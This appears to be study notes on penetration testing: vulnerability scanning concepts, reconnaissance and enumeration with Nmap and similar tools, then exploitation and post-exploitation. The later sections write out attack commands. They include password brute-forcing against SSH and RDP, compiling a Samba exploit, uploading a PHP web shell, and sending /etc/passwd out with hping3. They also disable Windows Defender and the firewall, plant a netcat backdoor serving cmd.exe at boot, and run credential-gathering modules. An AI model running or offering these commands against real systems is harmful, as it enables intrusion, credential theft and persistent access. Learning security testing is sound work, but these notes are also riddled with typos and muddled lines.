# Contents
# 1. [Vulnerability](#1).
### 0.0 [What is vulnerability](#0.0)
### 1.1 [Vulnerability Assessment](#1.1)
### 1.2 [Challenge of APT](#1.2)
### 1.3 [Penetration Testing](#1.3)
### 1.4 [ Host scanner ](#1.4)
### 1.5 [ Network scanner ](#1.5)
### 1.6 [ Tasks for vulnerability scanners ](#1.6)
### 1.7 [ Network Vulnerability scanning methods ](#1.7)
### 1.8 [ Port scanning ](#1.8)
### 1.9 [ Critical intelligence ](#1.9)
### 1.10 [ UDP Port Scans ](#1.10)
### 1.11 [ TCP port scans](#1.11)
### 1.12 [Stealth scans ](#1.12)
### 1.13 [  Stack fingerprinting ](#1.13)
### 1.14 [ Tool  ](#1.14)
### 1.15 [Enumeration ](#1.15)
### 1.16 [ Exploitation ](#1.16)
### 1.17 [ Intelligent Scanning ](#1.17)
### 1.18 [Creating security testing planning ](#1.18)
### 1.19 [Testing Security Methods ](#1.19)
#
# <a name="1"></a>1. vulnerability 
## <a name="0.0"></a>0.0 What is Vulnerability
- Which violates the product.
- Attackers breaking into system.
- To check system.
- All system have vulnerability but not all have exploit.

## <a name="1.0"></a>1.0 Vulnerability scanner

- Check ports version patch level.
- Generate reports.
- Manual Scanning.
- Scanner tool.
- Scanner automate the process.
- Reduces the time needed to compile lists of vulnerable system.
- Do not replace trained security people.


## <a name="1.1"></a>1.1 vulnerability assessment
- Running a vulnerability scanner manually.
- Compiling reports about vulnerability system.
- In penetration poc which vulnerability are on which system.
- What steps to mitigate organization.
- Which vulnerability. are likely to present risk to organization.

## <a name="1.2"></a>1.0 Challenge of APT
- Vulnerability scanner detect and prioritize vulnerability.
- Suggest solution for known vulnerability.
- Prioritize vulnerability based on their severity.
- vulnerability scanner do not know your network or system.
- Their output needs to be evaluated by real human.
- Assessing vulnerability require accurate knowledge of three area.
- The nature of a vulnerability or weakness.
- The real threats that can exploit or are exploiting the vulnerability.
- The consequences of a successful exploit on your organization.

## <a name="1.3"></a>1.3 Penetration testing
- Explore the possibility of exploits.
- Evaluate the effectiveness of security controls.
- Penetration testing uses a wide range of techniques.
- Acquire targets.
- Identify available services and topology.
- Enumerate user accounts, network shares, application versions.
- Discover vulnerability that can lead to exploit.
- Run exploit.

## <a name="1.4"></a>1.4 Host scanner 
- Host scanner run locally.
- System scanner.
- Inside OS.
- Can detect vulnerability and generate regular reports.
- Agents can be installed and generate regular reports.

## <a name="1.5"></a>1.5 Network scanner

* Network scanners probe systems remotely.
	* Looking for vulnerability that can be exploited remotely.
	* Mimics the access available to an external attackers.
* Many network scanners are standalone products.
	* A single user conducts scans from a single GUI.
	* Beyond trust retina.
	* Quialys.
* Some network scanner are deployed in a client/server model.
	* Client used to configure scans server conducts scans.
	* Nessus.
	* Rapid 7's NeXpose.

## <a name="1.1=6"></a>1.6 Tasks for vulnerability scanners

* Auditing of new systems.
	* Evaluate systems before they are brought online.
	* Validate compliance with security policy.
* Discovery of unknown systems.
	* To detect configuration changes that create new vulnerabilities.
* Educational.
	* Might first learn of a vulnerability from scanner alerts.

## <a name="1.7"></a>1.7 Network Vulnerability scanning methods

* Three main methods used by network vulnerability scanners.
	* Port scanning.
	* Live systems.
	* Services and enumeration.
* Each technique introduces increasing risk to end systems.
	* Port scanning should not crash a system.

## <a name="1.8"></a>1.8 Port scanning
* Port scanning determines which ports are listening on a targets.
	* Many network services run on established well-known ports.
	* FTP 21.
	* TELNET 23.
	* SMTP 25.
	* DNS 53 UDP/TCP.
	* Http 80.
## <a name="1.9"></a>1.9 Critical intelligence 
* Helps identify the applications in use.
* Narrows the search for exploitable vulnerabilities.
* TCP and UDP both include the concept of ports.
	* However different techniques are used to scan each protocol.

## <a name="1.10"></a>1.10 UDP Port Scans 

* UDP scans rely on negative feedback.
	* Packet with no payload is directed to a target ports.
	* If port is open no reply is received.
	* If port is closed target host sends ICMP Port Unreachable.

* DNS query on 53 receive reply.
* Type 3 code 3 port unreachable because port is unreachable.

## <a name="1.11"></a>1.11 TCP port scans
* Most TCP scans initiate and observe the TCP three way handshake.
	* Target port is sent a packet with the SYN flag set.
* RFC 793 specifies that every TCP host must respond.
	* Whether port is open or closed.
	* Getting no reply from the target is an exceptional condition.
* If port is closed target responds with RST/ACK.
* Indicates there is no software listening at that port.
* If no reply is received to a TCP SYN.
	* Something between scanner and target is dropping packets.
	* Traffic blocked by firewall system, router, or system software.

## <a name="1.12"></a>1.12 Stealth scans
* Stealth scans are a family of techniques that do one of the following:
	* Pass through firewall filtering rules.
	* Are not logged by the target.
	* Attempt to disguise probes as normal network traffic.
	* Most stealth scans probe TCP ports.
		* By sending packets with specific combination of TCP flags.
		* SYN/ACK. URG/PSH/FIN.  FIN  . NULL(no flag).
	* RFC 793 species how targets should respond to these probes.
		* Open port remain silent.
		* Closed ports send RST or RST/ACK.
	* Not every TCP/IP stack obeys the RFC.
		* Microsoft for example.
		* Limits the usefulness of stealth scans.

## <a name="1.13"></a>1.13 Stack fingerprinting

* Identify the targets OS.
	* By detecting subtle differences in TCP/IP stack implementation.

* Usually requires an open and closed port.
	* Specific probes are sent and replies are matched to a database.

* Stacks differ in how they respond to:
	* Unusual flag combinations.
	* SYN/FIN, No flags, all flags.
	* RST packets sent to open and closed ports.
		* Some stacks respond in both situations.
		* Other stacks do not.
	
## <a name="1.14"></a>1.14 Tool 
* Nmap
	* Scan includes:
		* Ping sweeps.
		* Ports scans.
		* Stealth scans.
		* Includes stack fingerprinting capability.
	* More and more on every update and check for scripts.

## <a name="1.15"></a>1.15 Enumeration 

* Determining the configuration of individual targets.
	* User accounts, network shares, OS services.
	* Techniques are OS specific.

* UNIX systems are often enumerated using:
	* RPC on port 111.
		* Determine which RPC programs are available.
	* Send mail on port 25.
		* Determine user account using VRFY command.

* Windows systems are commonly enumerated using SMB.
	* Running under NetBIOS over TCP on port 139.
	* On newer Windows System, running natively on TCP port 445.

* Windows Null sessions.
	* Windows systems permit smb null sessions by default.
	* A blank user name and password are used as credentials.
	* Null sessions can be used to enumerate critical information.
	* By connecting to the built-in named pipe share, IPC$.

* Other.
* Observing the initial text sent by a server is called banner grabbing.
* Banner often indicates what software is running.
	* Software name and version.
* OS version.
	* Special features.

* SNMP can be used to enumerate router configuration.
	* Including router tables and access control lists using tools like.
	* snmpwalk.
	* requires the community name.
	
	`snmpwalk -Os -c public -v 1 target_ip`

* Limitations of banner grabbing.
	* Version information may not include patch level.
	* IIS doesn't output which updates have been applied.
	* Banner can be altered by administrator.
	* This should be done on all services that have a banner.
	* Sometimes there is no banner.
	* Especially with UDP services.
	
* Non intrusive probing.
	* Look for the vulnerability without causing damage.
	* Inject data that produces a known response.
	* May  or may not actually exploit vulnerability.
	* Traverse directories, but don't create new files.
	* Send format string that reads memory.
	* But do not write anything into that memory.

## <a name="1.16"></a> 1.16 Exploitation.
* Most vulnerabilities scanner can conduct intrusive tests.
* Which actually exploit the vulnerability that is being checked.
* May cause crashes and DoS.
* Scanners are configured to skip these tests by default.
* Usually require the operator to OK an alert before enabling.

## <a name="1.17"></a> 1.17 Intelligent Scanning.

* First generation tools performed serial scans.
* Tests were run one after another.
* Each test ran in its own context.
* Required auditor to choose relevant tests.
	* Tools did not detect the type of server that they were scanning.
	* IIS tests might be run against an Apache server.
* Next-generation tools became more intelligent.
* Use results from previous tests as input to later tests.
* Examples:
	* Conduct port scan and perform OS detection.
	* Determines specific vulnerability tests.
	* If vulnerability reveals information, use this in other tests.
	* If NULL session allowed, use resulting registry information.

## <a name="1.18"></a> 1.18 Creating security testing planning:
*  Defining goals in writing.
	* State specifically what should be achieved.
	* performing a security test must have authorization.
	
*  Establishing scope of work that frames.
	*	Time.
	*	Addresses.
	*	Networks directly involved and transited.
	*	Available targets.
	
* Marking off limits.
	* Some systems and network may be highly critical.
	
* Posting rules of enggagement.
	* Check outline policy like social engineering, DoS.
	
* Defining the deliverable.
	* Whether the project involves one host and one vulnerability, or a
	Site penetration test, results must be recorded and reported.

* Testing outlines.
* [NIST 800-115](www.isecom.org/osstmm)

> Client want to know what the risk is and how to mitigate the risk.

## <a name="1.19"></a> 1.19 Testing Security Methods.
* War Games:
	* Red team vs blue team.
* Security testing: 
	* Light network evaluations.
	* Probing specific potential problem areas.
		* Host and network.
* Penetration testing:
	* Unannounced simulated attack.

# 2. HACKING METHODOLOGY
	
**	PLANNING
		A logincal and tested strategy is essential to reach and compromise civrims
		Research and record keepig are vital.
			Discovering what works(and what does not)
			The deliverable report
	
**	RECONNAISSANCE, FOOTPRINTING AND INFORMATION GATHERING
		Goal
			Discover the techinical environment of the victim.
			Gather useful non or semi techinical background information to be used later to refine attacks
			Publised and open information
		
		General information
			Assests
			Locations/networks
			Services
			Client and server applications
		Technical detail regarding the infrastructure
			OS
			IP addressing
				Internal, External, DMZ
			DNS-StuffMail servers
			
		Discover information about
			Steps taken to uncover the target information
			Gather initial target information
			Locate the network IP range
			Locate live machines
			Discover open ports/access points
			Services version and ports
			Map the network
			
			Registrars
				ARIN
				RIPENIC
				APNIC
				LACNIC
				AFRNIC
				whois.com 
					Domain information 
					Regitery contact
			nslookup
				[$nslookup]
				[server 8.8.8.8] ==> Google ip_address, 
				[set type=any] ==> Give me all the detail of the entered domain that we entered.
				[domain_name]
				Than for the next level use the server ip address you got from the information.
			DNS information
				Five types of queries
					Registrar query
						Gives information on potential domain matching the target.
					Organizational query
						Searches a specific registrar to obtain all instances of the targets name, showing many different company-associated domains.
					Domain query
						based on an organizational query of company-associated address, domain name, admin contact number, and system domain servers. The admin contact is useful to provide war dialer info and social engineering.
					Network query
						American Registry for Internet Numbers(ARIN) or another rester discover IP blocks.
			Kali Tools
				Information gathering
					
					dnsenum
						[dnsenum domain_name]
					
					dnsmap
					
					dnsrecon
						[dnsrecon -t std -d domain_name] -std standard -d dump
						If recurrsion enabled than it means weakness in name
						server.
					
					dnstracer
					
					dig
						more powerful nslookup
						[dig -t ns domain_name]
					
					dnswalk
					
					fierce
						It extracts subdomain with ip address
						Can conduct zone transwer as well
							Rare in the networks of today (while tunlling)
						Same process as 25 years ago.
					
					Netcraft
						website
						internal domains as well as site information
						not always accurate
					
					ThewayBackMachine
						Maintains complete archive of web sites
						Not as google cahce
						Can download software that is no longer available.
					
					Shodan
						Search engine for IOT
						Comprehensive queries
							Can locate data about the target
							Determine if the client has leaked sensitive information
						[query on search: "port 445"]
					
					urlcrazy
					
					Traceroute
						shows the path to target
							windows
								uses icmp by defalut
							nix
								uses UDP by default
					
					Competitive intelligence gathering
						Data gathering
						Data analysis
						Information verification
						Search Engine: Satellite and terrestrial photos
						Market research
						Government contracts
					
					Email Addresses
						Can enumerate email addresses and identify potential social engineering targets.
						theHarvester
							[theharvester -d domain_name -l 500 -b google -h test.html]
							finds all the email in the website
					
						Metagoofil
							[metagoofil -d domain_name -l 20 -t doc,pdf -n 5 -f enum.html -o enum-scan]
							Advanced search capability
							Downloads detected files
						
						Google Dorks 
							* googleguide.com/advanced_operators.html
						
						Bing Dorks 
							* msdn.microsoft.com/en-us/library/ff795620.aspx
						
						Bishopfox
							* Bishopfox.com
							Success requires creativity in searches
							
						Maltego
							Holygrail
									
		Resources
			DNS-Stuff
			The wayback machine
			whois
			The victims own published information 
			* know what the organization user resume
			

**	SCANNING, ENUMERATION AND FINGERPRINTING
		Goal
			Discover the specific detail that will allow matching of present assests to tvulnerabilities and exploits.
			Scannig is the active step of attempting to connect to systems to elicit a response
			
			For penetration testing the response is the key 
				SYN packet
					port closed
						RST
					port open
						SYN/ACK
					Any other response
						Some form of a device or firewall on the host.
			
			Scanning analysis
				Send in TCP and get back ICMP
					filtering device or software is in place. we can check packets reach to destination or not.
			
			Scanning Methodology

				TCP connection
					3 way handshake creates a socket and establish the connection
						SYN
						SYN,ACK
						ACK
					Half open scan
					
								
				Live systems
					We have to have targets
						[-sP, -sn] in Nmap
					
				netdiscover [checks for LAN]
					have to be on the local subnet
					has a passive and active model
					good for initial site contact
						run on laptop while meeting clients. ;)
						
					[netdiscover -r ip_address/range]
					[netdiscover -p] for passive
					[netdiscover -i eth0 -p] (listen the network)
					[netdiscover -i eth0 -p] (enumerate the target without sending packets, we just have to sit on the network)
					
			
				Nmap host discovery
					On local subnet uses ARP 
					ICMP is often blocked and host discovery can fail
					Use TCP host discovery sweep					
					[namp ip_address/range -PA80 -sn] 
					Ports
						What are the doors on these targets
							Remember all 0-65535 because Nmap only gives us the enumeration of 1000 ports only.
							
							[-sS,-sT,-sU] ==> s= scan S= stealth scan; T= connect scan; U= UDP scan
					
					Services
						What is behind these doors
							[-sV] 
					

					[Nmap -sP ip_address/range] (identifies all the machines , vmware switches etc and we can eliminate the vmware machines from targets)
					->
					[Nmap -sS ip_address/range] (check all the ports)
					->
					[Nmap -sV ip_address] (check services running on the system)
					->
					[nmaap -A ip_address] (Enumerate target with all options for output to get in xml)
					->
					[Nmap -A ip_address -oX test.xml Nmap.xsl] (go to Nmap directory and then use this or just move the stylesheet to the current path)
					->
					[Nmap -sC ip_address] 
					->
					[Nmap --script smb OS-discovery ip_address] (using scripting engine to enumerate smb OS)
					->
					[Nmap -O ip_address] (operating system detection there are tons of packet sent but find the alternative for this)
					
				TCP Dump(Low level scanning)
					
					check its man page
					[tcpdump -x -A port 21] default eth0 interface.
					[tcpdump -x TCP] can find 3 way handshake 
					[tcpdump -dst ip_address]
					[tcpdump -nn -A -l|grep "User-Agent:"] -> open browsesr 
					
				Tshark
					check man
					
				dsniff
					[dsniff] see only the credential on the network.
					
				
				Unicornscan
					checlk man
					
				
				SSL Scan (we can check the ciphers to encrypt data , we can make traffic look like specific app using these cipher or if we have a vulnerability in the cipher than can exploit it)
				
				
					[sslscan ip_address]
					[sslscan --show-client-cas ip_address]
					[sslscan --no-failed ip_address]
				
				ZMap
					[zmap --bandwidth=1000M --target-port=445 --max-results=10000 --output-file=results.txt ip_address]
				
				Masscan
					Fast scanner
					Designed to scan the internet
					similar to zmap
					installed by default on kali
			==>		can split the scan up and set times					
					[masscan ip_address/range -p 80,445]
					
				Hping (powerful and fast, Master tool for crafting packet. More you learn hping more powerful you become)
					quick way to identify 
					[hping3 ipaddress --scan 0-65535 -S | more]
					
					Example:
						vi attack.sig {any content}
						[hping3 -2 -p 500 ip_address -d 137 -E attack.sig] {2=UDP, attackers port 500, 137 victim port -E attack.sig
						[hping3 -2 -p 500 ip_address -d 100 -E attack.sig]  (bufferoverflow the port)
						[hping3 --scan known ip_address -S] (Scan all the ports)
						[hping3 --scan '1-3000' known ip_address -S] (Scan port from 1-3000)
						[hping3 127.0.0.1 --listen signature --safe --icmp] (create icmp packet to send)
						->
						[hping3 127.0.0.1 --icmp -d 100 --sign signature --file /etc/passwd]
						hping3 --flood ip_address
				Source port scanning
					Select source port scan and you can potentially bytpass stateless filters
						Also in cisco routers the use of the "established" keyword (Ack==1) can indicate a weak ACL depending on the rule order
					
					Source ports that commonly bypass the filtering
							port 20 ftp
							port 53 DNS-Stuff
							port 80
					Options for source port selection
						Nmap -gathering
						netcat -packet
						metasploit -set CPORT
							can get hte payload through the filtering device.
			Enumeration
				Is used to gather more in depth information about the target, such as open shares and user account information.
				Nmap [-sC, -A] for enumeration scanning
				Windows targets and Linux/Unix with Samba
				
				nbstat
				
				nbtscan
					gives a netbios machines
					[nbtscan -v -s : ip_address/range]
					if you see 1cG in the scan is a high value target.
				
				enum4linux
					If we see domain controllers than we can change our mac to that domain controller and can perform MITM attack.
					
					[enum4linux ip_address]
				
				Sparta
					Runs all of the tools for you
					Like a portal for scanning and enumeration along with others.
				
				wpscan
					wordpress vulnerability scanner
					Can use for enumeration 
						verision
						users
						plugins
						themes
					[wpscan --url ip_address/wordpress --enumerate u --enumerate t --enumerate p] u=users; t=themes p=plugins.
				
				Directory
					Web servers may or may not expose their directories.
					Kali has several tools for enumerating directories.
						wfuzz
						dirbuster
						
				Web App Technology
					Have to determine what is running on the web servers to test it.
					Whatweb
						installed by default in kali
						1700 plugins
						supports different levels
						-1
							passive(defult)
						-2
							Polite
						-3
							Impolite-guess URL when plugin matches(smart, guess a few urls)
						-4
							Aggressive -guess URL for every plugin (guess a lot of urls like)
						[whatweb domain_name ]
				
					
				SMB OS Discovery
					Nmap has scripts
						[Nmap --script smb OS-discovery.nse --script-args=unsafe=1 -p 445 ip_address]
				
				SNMP
					It is a gift because its a db full of information and we can extract data from a single query. works on UDP. 
						[Nmap -sU -p 161 ip_address]
						[snmpwalk -Os -c public -v 1 ip_address]
						check Nmap scripts for snmp 
						[/share/Nmap/script$ ls | snmp]
				
				
				Manual Banner Grabbing
					Connect to the port and investigate the response.
						telnet
						netcat
					check the version of the service running and exploit available or previous exploit.
					[nc -vn ip_address port_number]
					
					Dimtry
						We can grab banner
						[01]
						[dmitry -winsepo ip_address]
						[dmitry -pb ip_address] (email)
					
					Python
					[	import scoket
						bangrab = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
						bangrab.connect(("ip_address",port_number))
						bangrab.recv(4096)
						bangrab.close()
					]
					
				Targets
					TCP 43 
						DNS zone transfer
					UDP 137 
						NetBIOS Name Service
							16th byte represents data that can identify the type of machine 1C
								A domain controller and can be exploited
					RCP 139 
						NetBIOS session service(SMB over NetBIOS)
					UDP 161 
						Simple Network Management Protocol (SNMP)
					TCP/UDP 389 
						Lightweight Direct3ory Acess protocol (LDAP)
					RCP 445 
						SMB over TCP/IP
					TCP/UDP 3268 
						Global catalog service
					
				
							
				Identify Vulnerablities
					Manual
					Tools
				
				Exploit
					validation of the vulnerability
					Manual and tools
				
		
		Services and client software
		
		Application and vendor used
			Versions and revisions
			Service packs and patching
			Add-on modules
		
		Defenses
			Firewall
				Vendor
				Inbound and outbound ports allowed
			IDS used *what the - Wrginsation for detecting vulnerability.
			
**	IDENTIFY VULNERABILITY
		Goal 
			Discover the best or most likely way to compromise victims.
			Accurate enumeration makes this easier
			Discuss Vulnerability scanning
				Identify the attack surface
				Determine the risk
				Asses the severity of the findings 
				Draft a repoort of the findings Develop a remendiation  plan
				
				Network Vulnerability Scanning
					Look at the data at the network level 
					Assess the services accessible to the scanner
					The DMZ and other accessible zones are investigated
					Review the protocol and traffic of the subnet ... routing
					Determines the attack surface at the network layer and transport layer
						TCP
						UDP
						
				Host Vulnerability Scanners
					Review the attack surface on the host machine
					Assesment of the applications that are installed
					An investigation of the process running on the machine
					Work best with credential
				
				Scanner Configuration
					Usually involves setting scan parameters
					Set the network protocols and ports to test
					Identify the methods of host discovery (If ICMP is blocked than we have to move with TCP host discovery and than we make the policy)
					Create a policy for the actual environment
					Most scanners have templatese that assist
					Review configuration of scanners
					Scan Templates
				Nessus
				Containis a large number of templates for differrent scanning situations
				Dependent on the license that you are registered with.
					Home
						Limited templates
				Plugins are the audit is coded as a plugin within Nessus
				More than 80k plugins in Nessus
				Updating the plugins is critical
					online
						check updates every 24hrs
					offline
						Requires challenge andd response codes
						Needs the key provided by the tennable nessus
					Plugin  Families
						Different plufins based on requirements
							OS
							Application
					Sub-plugins
						Each plugin can have sub-plugins
							More granular information about the check
					Built-in-policies
						Nessus provides a variety of scan templates
						Most commonly
							Basic network scan
								Provides a compreehensive scan for most networks
								Does not scan all 65536 ports
									Have to change the settings for that
					Check for available plugin
						Each plugin represents an audit check
						Access the plugins
					Custom Scan
						When you elect to do a custom scan you have control over what plugins loaded, and you can manually select the ones you needed
							makes for a more granular approach to the testing
							Can take time to configure
							you need to have knowledge of what you are lookiing for to get the best results.
					Tailoring Scans
						5 groups
							Discovery
								Can select ports
								speed
								port scanner settings
								Protocols for pinging potential targetes
									Useful when a firewall is on
										ICMP blocked by defalut
							Assessment
								Can set more specific scan parameters
							Report
								Two Componets
									Processing
									Output
							Advanced
								Configure performance paramenters
								Low bandwidth links
						Scan Teplates
							Read the user guide it defines the settings within each templates.
						Scan Analysis Process
							Take the results and review themes
							Identify the points of weakness
								Hosts
								Protocol
								Application
							Investigate the listing of vulnerabilities
							Interrogate the vulnerability information
						Results
							Hosts
							Vulnerablities
							Remediation
								Maintains the list of required remediations for that scan configuration.
							History
								Maintains a historical listing of the scans against that configuration
									IP
									Hostname
									Range
									Application
							
				OpenVAS
					OpenSource
					Fork of the original Nessus project
					Its powerful but takes more time than nessus. (same developer)							
					OpenVAS Scan Tasks
					OpenVAS Port Configuration
						Similar to Nessus
						Contains plugins
						Same as Nessus concepts
					OpenVAS scan configuration 
						customize according to your target.
					OpenVAS NVTs
					OpenVAS CVE
					OpenVAS OS Listing
					OpenVAS Host Listing
					OpenVAS Topology
						Shows the network map of the target machines that have been scanned
					OpenVAS Result
					OpenVAS Update
						[openvas-feed-update]
					OpenVAS Reports
				Scan Analysis Process
						Take the results and review themes
						Identify the points of weakness
							Hosts
							Protocol
							Application
						Investigate the listing of vulnerabilities
						Interrogate the vulnerability information
						Evaluvate the recommended solution
							Write your own report going through all the report
							See if Nessus has provided an output
							Output can be use this in your report as well
						Review the risk information and additional details
							CVSS
							Vulnerability information
							Exploitable with
							References
						Examine at least one reference
							CVE
							BID
						Review the information and compare to your scanner data.
						BugtraqID
							Prioritise according to RCE or DoS
							Can show exploits as well
						
					Scan Analysis at the Network Level
						Before you scan a production network	
							scan a test machine
						Evaluate the scanning activity at the network level
							Use a protocol analyzer
						Tools
							TCPdump
								Command line
							Wireshark
								GUI
								Advanced protocol dissection
								Has extensive capability
								Filtering
									Can capture or display specific data based on packet attributes.
									(Analyse the response).
								Capability to examine sessions (check the attack surface)
						Nessus in wireshark
							Can review the network trafic sent to targets
							Allows us to determine the potential impact of a scan
							Can disable the plugins that we obsesrve that may cause potential network problems.
							(Packet level skill allows us to master the scanner)
						Wireshark Statistics
							Provide a view of the captured data
							Can see traffic from point to point
							Review the endpoint conversations
							HTTP Statistics
								Powerful way to view strings sent to HTTP (200 OK you have the vulnerability)
						
							
			Practical
				Website vulnerability check
					nvd.nist.gov
					cvedetails.com
					securityfocus.com (mantains the bugtrack ID)
					(zerodayinitiative.com)(Disclosed without patch)

					
					
				Tools
					Tools take time like days for scanning
					OpenVAS -kali
					WebGoat like a beebox by OWASP
					Vega -kali
						enter ip_address
						
			
		Utilize enumeration data and correalte with vulnerabilities and exploits.
		Use known characteristics of the victims.
			OS
			Applications
			DefensesMatch to available exploits	Not all exploits successfulley attack all vulnerable targets.
			Zero-day exploits are ideal.

**	EXPLOIT

		Goals:
			Discuuss validation of vulnerabilities
			Review exploit site
			Identify vector attack
			Explore exploit frameworks

		Reality 
			We have to have vulnerabilities
			Without them there iss no hack
			The goood news is all systems have some sort of flaws
			There are many exploit references and to get deep inot it requires some form of code uunderstanding
				This takes time
				Not all want to get that deep into it
				Use frameworks etc
		
		operating System
			There will still be flaws and bugs in any OS
			Fewer of them as time passes
			Windows Server 2016 is pretty tight
			Identify the attack surface and see the best fit
		
		Exploitation
			Validation of vulnerabilities
			Compromise the victim
				Use vulnerabilities that were discovered during the methodology
					Not all vulnerabilities will be exploitable
			Deliver the payload
				Once the civtim is compromised what should happen
					Leave a record proving access
					Grab files, plant a keystroke logger, crack passwords etc
			From this point of access
				Footprint and enumerate other systems
				Remember the rules of engagement (how much we can do after getting into machines)
		Exploit Targets
			Exploits are highley specific
			Have to know the build and revision number 
				Windows
					Service packe
				Linux/Unix
					Kernel Data
			In Metasploit view with show targets
		
		Data Collection
			Collect enough data to 
				Discover potential vulnerabilities
					Banners of the services
						SSMTP
						SSH
						HTTP/HTTPS
						FTP
						POP3
						
					OS identification
				Choose the approptriate exploit to match the target
					Not an exact science
				Narrow the field of attack vectors
					Highest privilege result is preferred
				
		Finding Exploits
			We need to find exploits
			Most vulnerability lists do not post exploits
				Except for bugtraq
			Can use http://seclists.org/
				A complete listing of security sites and feeds
			Ideal exploits are prooof of concept (POC)
			Once you get the exploit
				Have to review it
					could be a trojan horrse or other form of malware
					Rarely documented
					Require compilers or interpreters
					May not work
				Thoroughly test ie in a lab before deployment
			
			Exploit db
				
				www.exploit-db.com
					commonly have 0day exploits
									gnucitizen.org
				tposite.com/goto/securityvulns.com
				packerstormsecurity.com
				searchsploit kali tool
					[searchsploit shellshock remote]
					[searchsploit samba remote] (which version should work)
					
			Manual exploitation
				->	Nmap (gain information about target) 
				->	sslscan ip_address
				-> man smbclient (for samba smbclient -L ip_address)
				-> [searchsploit samba remote]
				-> cd into the path of exploit of version
				-> cp the file 
				-> gcc exploit.c -o samba
				-> ./samba -b -v ip_address
				
			
			If it is a compiled languuage
				Look for the readme file
				Is there a configure file
					./configure
					make
					make install
					make clean
				Compile the rest
					gcc -o <executable> <source>
			Scripting language
				Load the code in an interpreter and test it
				Always test in a lab or sandboxed environment
				Analyze it at hte packet level
			
			Full Disclouser
				We need to frequent the lists that are full disclosure.
					http://seclists.org/fulldisclosure
					
				Location of the attacker
					Remote is preferred
					Local can be used for internal testing or when we gain access via a remote vector ;)
				Are exploits available
					Is it ina a framework or have to build the code
				Impact of the exploit
					Denial of service are not much use
				Complexity
				
			Location 
				Remote
					Network is reachable - As mentioned is ideal
				Local
					Physical
						At the host machine
				Subnet
					Present on the same subnet (man in the middle)
				Intranet
					Inside the internet firewall
					
			Complexity
				Coding skills
					C
					Java
					PhP
					others
				State
				Decryption or decoding required
			Auuthentication
				Is it required
				Data Analysis should reveal potentaiila password attack vectors
					ssh
					smb
					rdp
				Most web apps need authentication
				
			Have you ever cnfigured a arouter and made a mistake
			We can always get access because of admin errors
			Services can be brute forced

			Remote Password Attack
				Hydra is the tool of choice 
					Can attack most of the desired services
					[hydra -e nsr -L sqlmap.txt ip_address ssh -t 4]
					[hydra -l username -P rocku.txt ip_address <protocol>] 
					[hydra -l username -P roockyou.txt ip_address <protocol>]l=user; P=password list
					[hydra ]
					[hydra ]
					[hydra ]
					[hydra ]
					[hydra ]
				Patator
					[patator ssh_login host=ip_address user=root password=FILE0 0=/rocku.txt]
					[patator ssh_login host=ip_address user=username password=FILE0 0=rockyou.txt]
					
				Ncrack (Faster)
					[ncrack -v --user sys -P /rocku.txt ssh://ip_address]
				
				Medusa [parallel and fast]
					[medusa -h ip_address -u root -P rocku.txt -M ssh]
						[-U = use a file]
				
					[medusa -h ip_address -u administrator -P rocku.txt -M rdp]
				
				Rdesktop
					rdesktop -u administrator -p password ip_address
					(We can see the remote desktop using this command)
				
				Whatweb	
					[whatweb http://ip_address](Tells about the cms or tech used by the domain)
				
				wp_scan
					[wpscan --url http://<ip_address> --enumerate u]
					[wpscan --url http://<ip_address> --enumerate vp] (find the vulnerability)
					Example:
						After finding the vulnerabilities
						-> use exploit/name
						->set RHOST <victim ip address>\r
						->set TARGETURI /<directory>\r
						->exploit
				
				WebShell(b374k-master)
					[php -f index.php -- -o myshell.php =p password --ess -c 9]
					
				-> upload the file
				-> nc -l -v -p 13123
				-> server run php command 
				
			Exploit Framework
				Metasploit
					Scanning auxiliary modules for webappps
					[db_nmap -A ip_address]
					[services -p 22]
					[search exploit]
					-> nikto -h ip_address
					[use exploit/name]
					[show options]
					[set RHOST]
					[set RPORT]
				Canvas
				CoreImapact
			
				Armitage/cobalt strike {Ultra Crazy Tool}
					Detect OS
					attack -> Find attack search exploit for exploit and hail marry for every possible exploit
					
			
			Payload
				There are extensive number of payloads
				meterprester shellshock
					Ability to grab password files
					might not be successful
					when the payload fails
						select another
							Generic bind shell is usually easiest
							
			Shell Options
				change port from 4444
				Change it to something else
					NTP
						123
				Want a port that is not proxied and can egress out
					Makes 80 etc bad choices in most cases
				set lport 123, 80 , 8080
				Required 
				
			SET
				setoolkit (without going FUD)
			->	4 ->  1 ->LHOST -> PORT
				
					
		Compromise the victim
			Use discovered or likely vulnerablities
			Employ a valid vector
		Deliver the payload
			Once the victim is compromised, what should happen?
				Additional enumeration
					pilfering
		From this point of access
			Footprint and enumerate other systems
			Remember the rules of engagement
			Perform local assessment
				[netstat -an]
				[net start]
				
**  POST Exploitation
		
		Goals:
			Identify the procedure for exfiltraring data after initial compromise
			Explore privilege escalation on different platforms
			
		After getting shell
			crack passwords
			Escalate privileges if required
			plant backdoor - if allowed by scope 
			conduct local assessment
			
			Disable firewall
				Local firewall can cause challenges, so best to disable it.
				PS: [netsh firewall set opmode disable]
			
			Disable windows defender
				PS:[net stop "Windows Defender Antivirus Network Inspection Service"]
				PS:[net stop "Windows Defender Antivirus Service"]
				PS:[net stop "Windows Defender Security Center Service"]
				Depending on the OS and your level of access, the commands might not all work.
			
			killav Script
			
			Local Assessment			
				Ipconfig.ifconfig
				Ping
				Nslookup
				Nbstat
				netstat -ano
					-linux
						netstat -vauptn
						lsof
				
				arp -a -(machines that are reachable)
				Windows net commands(locating shares and disabling protections)
				ftp and tftp(bring in your addition tools)
				telnet (banner grabbing in the local intranet)
				Check for utilities(especially in Linux)
				Route Print
					This will display the routing table of our computer; the netstat -r command can also be used for this
				tasklist/svc
					Running services
				Netsh
					netsh firewall set opmode disable
				If we have "meterpreter shell"
					[enumdesktops]
						prints information ablut all the running desktops
					[migrate]
						can migrate to a more and higher privilege process
					[getsystem]
						will attempt to escalate privileges by all methods available
					[bypassuac]
						Will attempt to bypass UAC -fails on newer Windows machines.
					[incognito]
						vaild impersonation token of a specific user, say administrator to impersonate that user without any authentication
					[list_tokens -u]
							List the available tokens for impersonation.
					Install backdoor
						If allowed in the scope install netcat
							first kill the antivirus
								killav
							upload/usr/share/windows-binaries/nc.exe C:\\windows\\system32
						Setup the backdoor at boot
							reg setval -k HKLM\\software\\miccrosoft\\windows\\currentversison\\run -d 'C:\windows\system32\nc.exe -LDP 4444 -e cmd.exe' -v netcat
					Windows Targets
						Enable remote desktop
							run getgui -e
						Add usuers for rdp
							run getgui -u username -p password
						Testing our access
							rdesktop -u username -p password <ip_address>
					Grab the data
						[run winenum]
						[run post/windows/gather/credentials/credential_collector]
						
						[run post/windows/gather/dumplinks] (Recent files)
